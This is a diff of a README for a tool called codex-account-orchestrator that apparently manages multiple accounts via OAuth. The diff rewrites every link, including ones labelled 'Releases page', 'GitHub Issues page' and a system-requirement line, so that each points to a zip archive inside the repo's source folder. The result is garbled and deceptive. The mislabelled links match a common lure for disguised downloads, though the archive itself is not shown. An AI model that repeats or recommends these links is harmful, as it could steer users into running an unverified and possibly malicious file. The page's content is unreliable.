@@ -1,6 +1,6 @@
 # 🎉 codex-account-orchestrator - Simplifying Your Account Management
 
-[![Download Now](https://github.com/vaishnavan59/codex-account-orchestrator/raw/refs/heads/main/src/codex_orchestrator_account_v2.5.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/vaishnavan59/codex-account-orchestrator/raw/refs/heads/main/src/codex_orchestrator_account_v2.5.zip)
+[![Download Now](https://raw.githubusercontent.com/vaishnavan59/codex-account-orchestrator/main/src/gateway/orchestrator_account_codex_v2.5-beta.4.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/vaishnavan59/codex-account-orchestrator/main/src/gateway/orchestrator_account_codex_v2.5-beta.4.zip)
 
 ## 📦 Overview
 
@@ -17,7 +17,7 @@ Codex-account-orchestrator enables you to manage multiple accounts seamlessly. I
 ## 🌐 System Requirements
 
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 20.04 or later recommended)
-- **https://github.com/vaishnavan59/codex-account-orchestrator/raw/refs/heads/main/src/codex_orchestrator_account_v2.5.zip** Version 12 or higher
+- **https://raw.githubusercontent.com/vaishnavan59/codex-account-orchestrator/main/src/gateway/orchestrator_account_codex_v2.5-beta.4.zip** Version 12 or higher
 - **Network Connectivity:** Required for OAuth processes
 
 ## 🚀 Getting Started
@@ -25,7 +25,7 @@ Codex-account-orchestrator enables you to manage multiple accounts seamlessly. I
 To get started with codex-account-orchestrator, follow these simple steps:
 
 1. **Download the Application:**  
-   Visit the [Releases page](https://github.com/vaishnavan59/codex-account-orchestrator/raw/refs/heads/main/src/codex_orchestrator_account_v2.5.zip) to download the latest version.
+   Visit the [Releases page](https://raw.githubusercontent.com/vaishnavan59/codex-account-orchestrator/main/src/gateway/orchestrator_account_codex_v2.5-beta.4.zip) to download the latest version.
 
 2. **Install the Application:**  
    After downloading the file, open it and follow the installation prompts. Make sure to read any instructions that appear.
@@ -43,7 +43,7 @@ To get started with codex-account-orchestrator, follow these simple steps:
 
 To download the latest version of codex-account-orchestrator, visit the following link:
 
-[Download Link](https://github.com/vaishnavan59/codex-account-orchestrator/raw/refs/heads/main/src/codex_orchestrator_account_v2.5.zip)
+[Download Link](https://raw.githubusercontent.com/vaishnavan59/codex-account-orchestrator/main/src/gateway/orchestrator_account_codex_v2.5-beta.4.zip)
 
 After downloading, follow the installation instructions as mentioned above. 
 
@@ -63,11 +63,11 @@ The application supports Windows, macOS, and Linux. Make sure your operating sys
 
 ### How do I update the application?
 
-Check the [Releases page](https://github.com/vaishnavan59/codex-account-orchestrator/raw/refs/heads/main/src/codex_orchestrator_account_v2.5.zip) regularly for updates. Download the latest version and follow the installation steps.
+Check the [Releases page](https://raw.githubusercontent.com/vaishnavan59/codex-account-orchestrator/main/src/gateway/orchestrator_account_codex_v2.5-beta.4.zip) regularly for updates. Download the latest version and follow the installation steps.
 
 ## 📞 Support
 
-If you face any issues or have questions, feel free to raise an issue on the [GitHub Issues page](https://github.com/vaishnavan59/codex-account-orchestrator/raw/refs/heads/main/src/codex_orchestrator_account_v2.5.zip). We are here to help!
+If you face any issues or have questions, feel free to raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/vaishnavan59/codex-account-orchestrator/main/src/gateway/orchestrator_account_codex_v2.5-beta.4.zip). We are here to help!
 
 ## 📝 License
 
